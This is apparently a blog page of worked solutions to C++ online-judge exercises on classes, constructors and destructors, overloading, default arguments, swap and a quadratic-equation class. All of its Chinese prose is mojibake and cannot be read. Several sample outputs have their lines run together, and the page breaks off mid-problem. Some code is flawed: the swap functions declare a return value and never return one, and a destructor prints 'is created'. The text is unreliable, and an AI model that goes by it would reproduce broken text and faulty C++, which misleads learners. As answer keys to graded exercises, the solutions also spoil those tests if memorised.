<p><a href="http://blog.csdn.net/hancunai0017/article/details/7032383">vectorç”¨æ³•</a></p>
<h3 id="2-Baseä¸Derived"><a href="#2-Baseä¸Derived" class="headerlink" title="2.Baseä¸Derived"></a>2.Baseä¸Derived</h3><blockquote>
<h2 id="Description-1"><a href="#Description-1" class="headerlink" title="Description"></a>Description</h2><p>å®šä¹‰Baseå’ŒDerivedç±»ï¼ŒDerivedç±»æ˜¯Baseç±»çš„å­ç±»ï¼Œä¸¤ä¸ªç±»éƒ½åªæœ‰1ä¸ªintç±»å‹çš„å±æ€§ã€‚å®šä¹‰å®ƒä»¬çš„æ„é€ å‡½æ•°å’Œææ„å‡½æ•°ï¼Œè¾“å‡ºä¿¡æ¯å¦‚æ ·ä¾‹æ‰€ç¤ºã€‚</p>
<h2 id="Input-1"><a href="#Input-1" class="headerlink" title="Input"></a>Input</h2><p>è¾“å…¥2ä¸ªæ•´æ•°ã€‚</p>
<h2 id="Output-1"><a href="#Output-1" class="headerlink" title="Output"></a>Output</h2><p>è§æ ·ä¾‹ã€‚</p>
<h2 id="Sample-Input-1"><a href="#Sample-Input-1" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>100</p>
<p>200</p>
<h2 id="Sample-Output-1"><a href="#Sample-Output-1" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>Base 100 is created.</p>
<p>Base 100 is created.</p>
<p>Derived 200 is created.</p>
<p>Derived 200 is created.</p>
<p>Base 100 is created.</p>
<p>Base 100 is created.</p>
<h2 id="HINT-1"><a href="#HINT-1" class="headerlink" title="HINT"></a>HINT</h2><h2 id="Append-Code-1"><a href="#Append-Code-1" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=2074&getkey=">append.cc</a>, </p>
</blockquote>
<pre><code>#include &lt;bits/stdc++.h&gt;
using namespace std;
class Base&#123;
public:
    int a;
    Base(int aa):a(aa)&#123;cout &lt;&lt; &quot;Base &quot; &lt;&lt; a &lt;&lt; &quot; is created.&quot; &lt;&lt; endl;&#125;
    ~Base()&#123;cout &lt;&lt; &quot;Base &quot; &lt;&lt; a &lt;&lt; &quot; is created.&quot; &lt;&lt; endl;&#125;
&#125;;
class Derived: public Base&#123;
public:
    int b;
    Derived(int aa,int bb):Base(aa),b(bb)&#123;cout &lt;&lt; &quot;Derived &quot; &lt;&lt; a &lt;&lt; &quot; is created.&quot; &lt;&lt; endl;&#125;
    ~Derived()&#123;cout &lt;&lt; &quot;Derived &quot; &lt;&lt; a &lt;&lt; &quot; is created.&quot; &lt;&lt; endl;&#125;
&#125;;
int main()
&#123;
    int a, b;
    cin&gt;&gt;a&gt;&gt;b;
    Base base(a);
    Derived derived(a, b);
    return 0;
&#125;</code></pre>
<h3 id="3-ç¼–å†™å‡½æ•°ï¼šä¸‰ä¸ªæ•°çš„æœ€å¤§æœ€å°å€¼-Append-Code"><a href="#3-ç¼–å†™å‡½æ•°ï¼šä¸‰ä¸ªæ•°çš„æœ€å¤§æœ€å°å€¼-Append-Code" class="headerlink" title="3.ç¼–å†™å‡½æ•°ï¼šä¸‰ä¸ªæ•°çš„æœ€å¤§æœ€å°å€¼ (Append Code)"></a>3.ç¼–å†™å‡½æ•°ï¼šä¸‰ä¸ªæ•°çš„æœ€å¤§æœ€å°å€¼ (Append Code)</h3><blockquote>
<h2 id="Description-2"><a href="#Description-2" class="headerlink" title="Description"></a>Description</h2><p>ç»™å‡ºä¸‰ä¸ªæ•°a,b,cï¼Œæœ€å¤§å€¼æ˜¯ï¼Ÿæœ€å°å€¼æ˜¯ï¼Ÿ</p>
<p>-â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”-</p>
<p>ç¼–å†™ä»¥ä¸‹ä¸¤ä¸ªå‡½æ•°ï¼š</p>
<p>get_num()çš„åŠŸèƒ½æ˜¯è¯»å–è¾“å…¥çš„ä¸‰ä¸ªæ•´æ•°a,b,cï¼›</p>
<p>max_min()çš„åŠŸèƒ½æ˜¯æ±‚å‡ºa,b,cçš„æœ€å¤§å€¼å’Œæœ€å°å€¼ã€‚</p>
<p>ä»¥ä¸Šå‡½æ•°çš„è°ƒç”¨æ ¼å¼è§â€œAppend Codeâ€ã€‚è¿™é‡Œä¸ç»™å‡ºå‡½æ•°åŸå‹ï¼Œè¯·é€šè¿‡main()å‡½æ•°è‡ªè¡Œç¡®å®šã€‚</p>
<h2 id="Input-2"><a href="#Input-2" class="headerlink" title="Input"></a>Input</h2><p>è¾“å…¥çš„ç¬¬ä¸€ä¸ªæ•´æ•°nï¼Œè¡¨ç¤ºæœ‰nç»„æµ‹è¯•æ•°æ®ï¼Œæ¯ç»„3ä¸ªæ•´æ•°ï¼ša,b,cã€‚a,b,céƒ½åœ¨intç±»å‹èŒƒå›´å†…ã€‚</p>
<h2 id="Output-2"><a href="#Output-2" class="headerlink" title="Output"></a>Output</h2><p>æ¯ç»„æµ‹è¯•æ•°æ®å¯¹åº”è¾“å‡ºä¸€è¡Œï¼šä¸ºa,b,cçš„æœ€å¤§å€¼å’Œæœ€å°å€¼ï¼Œæ ¼å¼è§sampleã€‚</p>
<h2 id="Sample-Input-2"><a href="#Sample-Input-2" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>5</p>
<p>20 15 10</p>
<p>10 15 20</p>
<p>100 100 0</p>
<p>0 1 -1</p>
<p>0 0 0</p>
<h2 id="Sample-Output-2"><a href="#Sample-Output-2" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>case 1 : 20, 10</p>
<p>case 2 : 20, 10</p>
<p>case 3 : 100, 0</p>
<p>case 4 : 1, -1</p>
<p>case 5 : 0, 0</p>
<h2 id="HINT-2"><a href="#HINT-2" class="headerlink" title="HINT"></a>HINT</h2><h2 id="Append-Code-2"><a href="#Append-Code-2" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=0&pid=1382&getkey=">append.c</a>, <a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=1382&getkey=">append.cc</a>, </p>
</blockquote>
<pre><code>#include &lt;bits/stdc++.h&gt;
using namespace std;
void get_num(int &amp;a,int &amp;b,int &amp;c)&#123;
    cin &gt;&gt; a &gt;&gt; b &gt;&gt; c;
&#125;
void max_min(int &amp;mmax,int &amp;mmin,int &amp;a,int &amp;b,int &amp;c)&#123;
    mmax = a;
    mmin = a;
    if(b &gt; mmax)
        mmax = b;  
    if(b &lt; mmin)
        mmin = b;
    if(c &gt; mmax)
        mmax = c;
    if(c &lt; mmin)
        mmin = c;
&#125;
////////////////////////////
int main()
&#123;
    int cases;
    int mmax, mmin, a, b, c;

    cin&gt;&gt;cases;
    for(int i = 1; i &lt;= cases; ++i)
    &#123;
        get_num(a, b, c);
        max_min(mmax, mmin, a, b, c);
        cout&lt;&lt;&quot;case &quot;&lt;&lt;i&lt;&lt;&quot; : &quot;&lt;&lt;mmax&lt;&lt;&quot;, &quot;&lt;&lt;mmin&lt;&lt;endl;
    &#125;
&#125;
</code></pre>
<h3 id="4-é‡è½½å‡½æ•°ï¼šmax"><a href="#4-é‡è½½å‡½æ•°ï¼šmax" class="headerlink" title="4.é‡è½½å‡½æ•°ï¼šmax"></a>4.é‡è½½å‡½æ•°ï¼šmax</h3><blockquote>
<h2 id="Description-3"><a href="#Description-3" class="headerlink" title="Description"></a>Description</h2><p>ç¼–å†™ä¸¤ä¸ªåä¸ºmaxçš„å‡½æ•°ï¼Œå®ƒä»¬æ˜¯é‡è½½å‡½æ•° ï¼Œç”¨äºæ±‚ä¸¤ä¸ªæ•´æ•°æˆ–å®æ•°çš„æœ€å¤§å€¼ã€‚å®ƒä»¬çš„åŸå‹åˆ†åˆ«æ˜¯ï¼š</p>
<p>int max(int a,int b);</p>
<p>double max(double a,double b);</p>
<p>è¿”å›å€¼æ˜¯aå’Œbçš„æœ€å¤§å€¼ã€‚</p>
<h2 id="Input-3"><a href="#Input-3" class="headerlink" title="Input"></a>Input</h2><p>è¾“å…¥4ä¸ªæ•°ï¼Œå‰ä¸¤ä¸ªæ•°æ˜¯intç±»å‹çš„æ•´æ•°ï¼Œå2ä¸ªæ•°æ˜¯doubleç±»å‹çš„å®æ•°ã€‚</p>
<h2 id="Output-3"><a href="#Output-3" class="headerlink" title="Output"></a>Output</h2><p>è¾“å‡º2ä¸ªæ•°ï¼Œæ¯ä¸ªæ•°å ä¸€è¡Œã€‚ç¬¬ä¸€ä¸ªæ•°å¯¹åº”äºè¾“å…¥çš„ä¸¤ä¸ªæ•´æ•°çš„æœ€å¤§å€¼ï¼Œç¬¬äºŒä¸ªæ•°å¯¹åº”äºè¾“å…¥çš„ä¸¤ä¸ªå®æ•°çš„æœ€å¤§å€¼ã€‚</p>
<h2 id="Sample-Input-3"><a href="#Sample-Input-3" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>1 2</p>
<p>1.4 1.3</p>
<h2 id="Sample-Output-3"><a href="#Sample-Output-3" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>21.4</p>
<h2 id="HINT-3"><a href="#HINT-3" class="headerlink" title="HINT"></a>HINT</h2><h2 id="Append-Code-3"><a href="#Append-Code-3" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=1279&getkey=">append.cc</a>, </p>
</blockquote>
<pre><code>#include &lt;iostream&gt;
using namespace std;
int max(int a,int b)&#123;
    int max;
    if(a &gt; b)
        max = a;
    else
        max = b;
    return max;
&#125;
double max(double a,double b)&#123;
    double max;
    if(a &gt; b)
        max = a;
    else
        max = b;
    return max;
&#125;
////////////////////
int main()
&#123;
    int a,b;
    double c,d;
    cin&gt;&gt;a&gt;&gt;b;
    cout&lt;&lt;max(a,b)&lt;&lt;endl;
    cin&gt;&gt;c&gt;&gt;d;
    cout&lt;&lt;max(c,d)&lt;&lt;endl;
    return 0;
&#125;
</code></pre>
<h3 id="5-é»˜è®¤å‚æ•°ï¼šæ±‚åœ†é¢ç§¯"><a href="#5-é»˜è®¤å‚æ•°ï¼šæ±‚åœ†é¢ç§¯" class="headerlink" title="5.é»˜è®¤å‚æ•°ï¼šæ±‚åœ†é¢ç§¯"></a>5.é»˜è®¤å‚æ•°ï¼šæ±‚åœ†é¢ç§¯</h3><blockquote>
<h2 id="Description-4"><a href="#Description-4" class="headerlink" title="Description"></a>Description</h2><p>ç¼–å†™ä¸€ä¸ªå¸¦é»˜è®¤å€¼çš„å‡½æ•°ï¼Œç”¨äºæ±‚åœ†é¢ç§¯ã€‚å…¶åŸå‹ä¸ºï¼š</p>
<p>double area(double r=1.0);</p>
<p>å½“è°ƒç”¨å‡½æ•°æ—¶æŒ‡å®šå‚æ•°rï¼Œåˆ™æ±‚åŠå¾„ä¸ºrçš„åœ†çš„é¢ç§¯ï¼›å¦åˆ™æ±‚åŠå¾„ä¸º1çš„åœ†é¢ç§¯ã€‚</p>
<p>å…¶ä¸­ï¼ŒPIå–å€¼3.14ã€‚</p>
<h2 id="Input-4"><a href="#Input-4" class="headerlink" title="Input"></a>Input</h2><p>ä¸€ä¸ªå®æ•°ï¼Œæ˜¯åœ†çš„åŠå¾„ã€‚</p>
<h2 id="Output-4"><a href="#Output-4" class="headerlink" title="Output"></a>Output</h2><p>è¾“å‡ºæœ‰2è¡Œã€‚ç¬¬ä¸€è¡Œæ˜¯ä»¥è¾“å…¥æ•°å€¼ä¸ºåŠå¾„çš„åœ†é¢ç§¯ï¼Œç¬¬äºŒè¡Œæ˜¯åŠå¾„ä¸º1çš„åœ†é¢ç§¯ã€‚</p>
<h2 id="Sample-Input-4"><a href="#Sample-Input-4" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>19</p>
<h2 id="Sample-Output-4"><a href="#Sample-Output-4" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>1133.54</p>
<p>3.14</p>
<h2 id="HINT-4"><a href="#HINT-4" class="headerlink" title="HINT"></a>HINT</h2><h2 id="Append-Code-4"><a href="#Append-Code-4" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=1280&getkey=">append.cc</a>, </p>
</blockquote>
<pre><code>#include &lt;iostream&gt;
using namespace std;
#define PI 3.14
double area(double r = 1.0)&#123;
    return PI*r*r;
&#125; 

/////////////////////////
int main()
&#123;
    double r;
    cin&gt;&gt;r;
    cout&lt;&lt;area(r)&lt;&lt;endl;
    cout&lt;&lt;area()&lt;&lt;endl;
    return 0;
&#125;</code></pre>
<h3 id="6-æ±‚-x-y-z-2"><a href="#6-æ±‚-x-y-z-2" class="headerlink" title="6.æ±‚(x-y+z)*2"></a>6.æ±‚(x-y+z)*2</h3><blockquote>
<h2 id="Description-5"><a href="#Description-5" class="headerlink" title="Description"></a>Description</h2><p>ç¼–å†™ä¸€ä¸ªç¨‹åºï¼Œæ±‚è§£ä»¥ä¸‹ä¸‰ä¸ªå‡½æ•°ï¼š</p>
<p>f(x,y,z)=2*(x-y+z)</p>
<p>f(x,y)  =2*(x-y)</p>
<p>f(x)    =2*(x-1)</p>
<p>å‡½æ•°è°ƒç”¨æ ¼å¼è§append.ccã€‚</p>
<p>append.ccä¸­å·²ç»™å‡ºmain()å‡½æ•°ã€‚</p>
<h2 id="Input-5"><a href="#Input-5" class="headerlink" title="Input"></a>Input</h2><p>è¾“å…¥çš„æµ‹è¯•æ•°æ®ä¸ºå¤šç»„ã€‚æ¯ç»„æµ‹è¯•æ•°æ®çš„ç¬¬ä¸€ä¸ªæ•°æ˜¯nï¼ˆ1&lt;=n&lt;=3ï¼‰ï¼Œè¡¨ç¤ºåé¢æœ‰nä¸ªæ•´æ•°ã€‚</p>
<p>å½“nä¸º3æ—¶ï¼Œåè·Ÿ3ä¸ªè¾“å…¥ä¸ºx,y,zï¼›</p>
<p>å½“nä¸º2æ—¶ï¼Œåè·Ÿ2ä¸ªè¾“å…¥ä¸ºx,yï¼›</p>
<p>å½“nä¸º1æ—¶ï¼Œåè·Ÿ1ä¸ªè¾“å…¥ä¸ºxï¼›</p>
<p>å½“nä¸º0æ—¶ï¼Œè¡¨ç¤ºè¾“å…¥ç»“æŸ</p>
<p>è¾“å…¥çš„nä¸ä¼šæœ‰å…¶ä»–å–å€¼ã€‚</p>
<p>æ‰€æœ‰è¿ç®—éƒ½ä¸ä¼šè¶…å‡ºintç±»å‹èŒƒå›´ã€‚</p>
<h2 id="Output-5"><a href="#Output-5" class="headerlink" title="Output"></a>Output</h2><p>æ¯ç»„æµ‹è¯•æ•°æ®å¯¹åº”ä¸€ä¸ªè¾“å‡ºã€‚è¾“å‡ºx-y+zçš„å€¼ã€‚</p>
<h2 id="Sample-Input-5"><a href="#Sample-Input-5" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>3 121 38 452 39 111 73</p>
<h2 id="Sample-Output-5"><a href="#Sample-Output-5" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>25656144</p>
<h2 id="HINT-5"><a href="#HINT-5" class="headerlink" title="HINT"></a>HINT</h2><h2 id="Append-Code-5"><a href="#Append-Code-5" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=1381&getkey=">append.cc</a>, </p>
</blockquote>
<pre><code>#include &lt;bits/stdc++.h&gt;
using namespace std;
int f(int x,int y,int z)&#123;
    return 2*(x-y+z);
&#125;
int f(int x,int y)&#123;
    return 2*(x-y);
&#125;
int f(int x)&#123;
    return 2*(x-1);
&#125;

////////////////////////
int main()
&#123;
    int n, x, y, z;
    while(cin&gt;&gt;n)
    &#123;
        if(n == 3)
        &#123;
            cin&gt;&gt;x&gt;&gt;y&gt;&gt;z;
            cout&lt;&lt;f(x, y, z)&lt;&lt;endl;
        &#125;
        if(n == 2)
        &#123;
            cin&gt;&gt;x&gt;&gt;y;
            cout&lt;&lt;f(x, y)&lt;&lt;endl;
        &#125;
        if(n == 1)
        &#123;
            cin&gt;&gt;x;
            cout&lt;&lt;f(x)&lt;&lt;endl;
        &#125;
        if(n == 0)
            break;
    &#125;
&#125;</code></pre>
<h3 id="7-ç¼–å†™å‡½æ•°ï¼šSwap-I-Append-Code"><a href="#7-ç¼–å†™å‡½æ•°ï¼šSwap-I-Append-Code" class="headerlink" title="7.ç¼–å†™å‡½æ•°ï¼šSwap (I) (Append Code)"></a>7.ç¼–å†™å‡½æ•°ï¼šSwap (I) (Append Code)</h3><blockquote>
<h2 id="Description-6"><a href="#Description-6" class="headerlink" title="Description"></a>Description</h2><p>ç¼–å†™ç”¨æ¥äº¤æ¢ä¸¤ä¸ªæ•°çš„å‡½æ•°ï¼Œä½¿å¾—â€œAppend Codeâ€ä¸­çš„main()å‡½æ•°èƒ½æ­£ç¡®è¿è¡Œã€‚</p>
<p>-â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”-</p>
<p>ç”¨Cå®ç°ä¸‰ä¸ªå‡½æ•°int_swap()ã€dbl_swap()ã€SWAP()ï¼Œå…¶ä¸­SWAP()æ˜¯ä¸ªå¸¦å‚å®ã€‚</p>
<p>ç”¨C++å®ç°ä¸¤ä¸ªå‡½æ•°ï¼Œéƒ½ä»¥swap()å‘½åã€‚</p>
<p>ä»¥ä¸Šå‡½æ•°çš„è°ƒç”¨æ ¼å¼è§â€œAppend Codeâ€ã€‚è¿™é‡Œä¸ç»™å‡ºå‡½æ•°åŸå‹ï¼Œå®ƒä»¬çš„å‚æ•°è¯·é€šè¿‡main()å‡½æ•°è‡ªè¡Œç¡®å®šã€‚</p>
<h2 id="Input-6"><a href="#Input-6" class="headerlink" title="Input"></a>Input</h2><p>è¾“å…¥ä¸º4è¡Œï¼Œæ¯è¡Œ2ä¸ªæ•°ã€‚</p>
<h2 id="Output-6"><a href="#Output-6" class="headerlink" title="Output"></a>Output</h2><p>è¾“å‡ºä¸º4è¡Œï¼Œæ¯è¡Œ2ä¸ªæ•°ã€‚æ¯è¡Œè¾“å‡ºçš„ä¸¤æ•°ä¸ºæ¯è¡Œè¾“å…¥çš„é€†åºã€‚</p>
<h2 id="Sample-Input-6"><a href="#Sample-Input-6" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>12 57</p>
<p>9 -3</p>
<p>-12 4</p>
<p>3 5</p>
<h2 id="Sample-Output-6"><a href="#Sample-Output-6" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>57 12-3 94 -125 3</p>
<h2 id="HINT-6"><a href="#HINT-6" class="headerlink" title="HINT"></a>HINT</h2><p>â€œAppend Codeâ€ä¸­ç”¨åˆ°çš„å¤´æ–‡ä»¶ã€å…¨å±€å˜é‡æˆ–å®çš„å®šä¹‰åº”è‡ªè¡Œè¡¥å……ã€‚</p>
<h2 id="Append-Code-6"><a href="#Append-Code-6" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=0&pid=1107&getkey=">append.c</a>, <a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=1107&getkey=">append.cc</a>, </p>
</blockquote>
<pre><code>#include &lt;bits/stdc++.h&gt;
using namespace std;
int swap(int *a,int *b)&#123;
    int c;
    c = *a;
    *a = *b;
    *b = c;
&#125;
double swap(double *a,double *b)&#123;
    double c;
    c = *a;
    *a = *b;
    *b = c;

&#125;
////////////////////
int main()
&#123;
    int x1, y1;

    cin&gt;&gt;x1&gt;&gt;y1;
    swap(&amp;x1, &amp;y1);
    cout&lt;&lt;x1&lt;&lt;&quot; &quot;&lt;&lt;y1&lt;&lt;endl;

    cin&gt;&gt;x1&gt;&gt;y1;
    swap(x1, y1);
    cout&lt;&lt;x1&lt;&lt;&quot; &quot;&lt;&lt;y1&lt;&lt;endl;

    double x2, y2;

    cin&gt;&gt;x2&gt;&gt;y2;
    swap(&amp;x2, &amp;y2);
    cout&lt;&lt;x2&lt;&lt;&quot; &quot;&lt;&lt;y2&lt;&lt;endl;

    cin&gt;&gt;x2&gt;&gt;y2;
    swap(x2, y2);
    cout&lt;&lt;x2&lt;&lt;&quot; &quot;&lt;&lt;y2&lt;&lt;endl;
&#125;</code></pre>
<h3 id="8-ä½ ä¼šå®šä¹‰ç±»å—ï¼Ÿ"><a href="#8-ä½ ä¼šå®šä¹‰ç±»å—ï¼Ÿ" class="headerlink" title="8.ä½ ä¼šå®šä¹‰ç±»å—ï¼Ÿ"></a>8.ä½ ä¼šå®šä¹‰ç±»å—ï¼Ÿ</h3><blockquote>
<h2 id="Description-7"><a href="#Description-7" class="headerlink" title="Description"></a>Description</h2><p>å®šä¹‰ä¸€ä¸ªç±»Demoï¼Œæœ‰æ„é€ å‡½æ•°ã€ææ„å‡½æ•°å’Œæˆå‘˜å‡½æ•°show()ï¼Œå…¶ä¸­show()æ ¹æ®æ ·ä¾‹çš„æ ¼å¼è¾“å‡ºå…·ä½“å±æ€§å€¼ã€‚è¯¥ç±»åªæœ‰ä¸€ä¸ªintç±»å‹çš„æˆå‘˜ã€‚</p>
<h2 id="Input-7"><a href="#Input-7" class="headerlink" title="Input"></a>Input</h2><p>è¾“å…¥åªæœ‰ä¸€ä¸ªæ•´æ•°ï¼Œintç±»å‹èŒƒå›´å†…ã€‚</p>
<h2 id="Output-7"><a href="#Output-7" class="headerlink" title="Output"></a>Output</h2><p>è§æ ·ä¾‹ã€‚</p>
<h2 id="Sample-Input-7"><a href="#Sample-Input-7" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>-100</p>
<h2 id="Sample-Output-7"><a href="#Sample-Output-7" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>A data 10 is created!A data 0 is created!A data -100 is created!This is data 10This is data 0This is data -100A data -100 is erased!A data 0 is erased!A data 10 is erased!</p>
<h2 id="HINT-7"><a href="#HINT-7" class="headerlink" title="HINT"></a>HINT</h2><h2 id="Append-Code-7"><a href="#Append-Code-7" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="file:///D:/éƒä½³ä¼Ÿçš„æ–‡ä»¶/å­¦ä¹ èµ„æ–™/OJ-C++/å®éªŒ/1/Problem%20A_%20ä½ ä¼šå®šä¹‰ç±»å—ï¼Ÿ_files/Source%20Code.html">append.cc</a>, </p>
</blockquote>
<pre><code>#include &lt;iostream&gt;
using namespace std;
class Demo&#123;
public:
    int a;
    Demo(int aa=0):a(aa)&#123;cout &lt;&lt; &quot;A data &quot; &lt;&lt; a &lt;&lt; &quot; is created!&quot; &lt;&lt; endl;&#125;
    ~Demo()&#123;cout &lt;&lt; &quot;A data &quot; &lt;&lt; a &lt;&lt; &quot; is erased!&quot; &lt;&lt; endl;&#125;
    void show()&#123;cout &lt;&lt; &quot;This is data &quot; &lt;&lt; a &lt;&lt; endl;&#125;
&#125;;
/////////////////////
int main()
&#123;
    Demo tmp(10), tmp2;
    int d;
    cin&gt;&gt;d;
    Demo tmp3(d);

    tmp.show();
    tmp2.show();
    tmp3.show();
    return 0;
&#125;
</code></pre>
<h3 id="9-ä¸€å…ƒäºŒæ¬¡æ–¹ç¨‹ç±»"><a href="#9-ä¸€å…ƒäºŒæ¬¡æ–¹ç¨‹ç±»" class="headerlink" title="9.ä¸€å…ƒäºŒæ¬¡æ–¹ç¨‹ç±»"></a>9.ä¸€å…ƒäºŒæ¬¡æ–¹ç¨‹ç±»</h3><blockquote>
<h2 id="Description-8"><a href="#Description-8" class="headerlink" title="Description"></a>Description</h2><p>å®šä¹‰ä¸€ä¸ªè¡¨ç¤ºä¸€å…ƒäºŒæ¬¡æ–¹ç¨‹çš„ç±»Equationï¼Œè¯¥ç±»è‡³å°‘å…·æœ‰ä»¥ä¸‹3ä¸ªæ•°æ®æˆå‘˜ï¼šaã€bå’Œcï¼Œç”¨äºè¡¨ç¤ºæ–¹ç¨‹â€œa<em>x</em>x + b*x +c = 0â€ã€‚åŒæ—¶ï¼Œè¯¥ç±»è¿˜è‡³å°‘å…·æœ‰ä»¥ä¸‹ä¸¤ä¸ªæˆå‘˜å‡½æ•°ï¼š</p>
<p>\1. void solve()ï¼šç”¨äºæ±‚æ–¹ç¨‹çš„æ ¹ã€‚</p>
<p>\2. void printRoot()ï¼šç”¨äºè¾“å‡ºæ–¹ç¨‹çš„æ ¹ã€‚</p>
<p>è®¾å®šï¼š</p>
<p>\1. æ‰€æœ‰è¾“å…¥çš„aã€bã€cæ‰€ç”Ÿæˆçš„æ–¹ç¨‹å¿…å®šæœ‰ä¸ª2ä¸ªä¸åŒçš„å®æ ¹ã€‚</p>
<p>\2. è¾“å‡ºçš„ä¸¤ä¸ªæ ¹æŒ‰ç…§ä»å¤§åˆ°å°çš„é¡ºåºè¾“å‡ºï¼Œä¸¤ä¸ªæ ¹ä¹‹é—´ç”¨ä¸€ä¸ªç©ºæ ¼éš”å¼€ï¼Œè€Œä¸”æ¯ä¸ªæ ¹å¿…é¡»ä¸”ä»…èƒ½ä¿ç•™2ä½å°æ•°ï¼Œå³ä½¿å°æ•°éƒ¨åˆ†ä¸º0ã€‚</p>
<p>\3. è¯·æ ¹æ®æ ·ä¾‹å’Œç»™å‡ºçš„main()å‡½æ•°å®šä¹‰ç›¸åº”çš„æ„é€ å‡½æ•°ã€‚</p>
<h2 id="Input-8"><a href="#Input-8" class="headerlink" title="Input"></a>Input</h2><p>è¾“å…¥æœ‰è‹¥å¹²è¡Œï¼Œæ¯è¡Œæœ‰3ä¸ªå®æ•°ï¼Œåˆ†åˆ«ä¸ºæ–¹ç¨‹â€œa<em>x</em>x + b*x + c = 0â€ä¸­çš„ç³»æ•°aã€bã€cã€‚</p>
<h2 id="Output-8"><a href="#Output-8" class="headerlink" title="Output"></a>Output</h2><p>æŒ‰ç…§é¢˜ç›®è¦æ±‚ä¸­çš„è®¾å®šæ¡ä»¶2è¾“å‡ºæ–¹ç¨‹çš„æ ¹ã€‚</p>
<h2 id="Sample-Input-8"><a href="#Sample-Input-8" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>1 3 2</p>
<h2 id="Sample-Output-8"><a href="#Sample-Output-8" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>-1.00 -2.00</p>
<h2 id="HINT-8"><a href="#HINT-8" class="headerlink" title="HINT"></a>HINT</h2><p>å¯ä»¥ä½¿ç”¨fixedå’Œsetprecision()æ¥å®ç°è¾“å‡ºå›ºå®šå°æ•°ä½æ•°çš„æ•°å€¼ã€‚</p>
<h2 id="Append-Code-8"><a href="#Append-Code-8" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="file:///D:/éƒä½³ä¼Ÿçš„æ–‡ä»¶/å­¦ä¹ èµ„æ–™/OJ-C++/å®éªŒ/1/Problem%20B_%20ä¸€å…ƒäºŒæ¬¡æ–¹ç¨‹ç±»_files/Source%20Code.html">append.cc</a>, </p>
</blockquote>
<pre><code>#include &lt;iostream&gt;
#include &lt;iomanip&gt;
#include &lt;math.h&gt;
using namespace std;
class Equation&#123;
public:
    double a,b,c,drt,x1,x2;
    Equation(double aa,double bb,double cc):a(aa),b(bb),c(cc)&#123;&#125;
    void solve()&#123;
        drt=sqrt(b*b-4*a*c);
    &#125;
    void printRoot()&#123;
        x1=(-b+drt)/(2*a);
        x2=(-b-drt)/(2*a);
         cout &lt;&lt; setiosflags(ios::fixed) &lt;&lt; setprecision(2) &lt;&lt; x1 &lt;&lt; &quot; &quot; &lt;&lt; x2 &lt;&lt; endl; 
    &#125;
&#125;;
////////////////////////////////
int main()
&#123;
    double a, b, c;
    while (cin&gt;&gt;a&gt;&gt;b&gt;&gt;c)
    &#123;
        Equation equ(a,b,c);
        equ.solve();
        equ.printRoot();
    &#125;
    return 0;
&#125;</code></pre>
<blockquote>
<h3 id="fixed-å’Œsetprecision-çš„ç”¨æ³•"><a href="#fixed-å’Œsetprecision-çš„ç”¨æ³•" class="headerlink" title="fixed å’Œsetprecision()çš„ç”¨æ³•"></a>fixed å’Œsetprecision()çš„ç”¨æ³•</h3><p>ä½¿ç”¨setprecision(n)å¯æ§åˆ¶è¾“å‡ºæµæ˜¾ç¤ºæµ®ç‚¹æ•°çš„æ•°å­—ä¸ªæ•°ã€‚C++é»˜è®¤çš„æµè¾“å‡ºæ•°å€¼æœ‰æ•ˆä½æ˜¯6ã€‚<br>  å¦‚æœsetprecision(n)ä¸setiosflags(ios::fixed)åˆç”¨ï¼Œå¯ä»¥æ§åˆ¶å°æ•°ç‚¹å³è¾¹çš„æ•°å­—ä¸ªæ•°ã€‚setiosflags(ios::fixed)æ˜¯ç”¨å®šç‚¹æ–¹å¼è¡¨ç¤ºå®æ•°ã€‚<br>  å¦‚æœä¸setiosnags(ios::scientific)åˆç”¨ï¼Œ å¯ä»¥æ§åˆ¶æŒ‡æ•°è¡¨ç¤ºæ³•çš„å°æ•°ä½æ•°ã€‚setiosflags(ios::scientific)æ˜¯ç”¨æŒ‡æ•°æ–¹å¼è¡¨ç¤ºå®æ•°ã€‚</p>
</blockquote>
<h3 id="10-æ•´æ•°çš„å°è£…"><a href="#10-æ•´æ•°çš„å°è£…" class="headerlink" title="10.æ•´æ•°çš„å°è£…"></a>10.æ•´æ•°çš„å°è£…</h3><blockquote>
<h2 id="Description-9"><a href="#Description-9" class="headerlink" title="Description"></a>Description</h2><p>ç°åœ¨ï¼Œè¯·ç¼–å†™ä¸€ä¸ªIntegerç±»ï¼Œå°†æ•´æ•°å°è£…èµ·æ¥ã€‚ç›®å‰ï¼Œåªéœ€è¦ä½ æ¥å®ç°æœ€åŸºæœ¬çš„åŠŸèƒ½ï¼š</p>
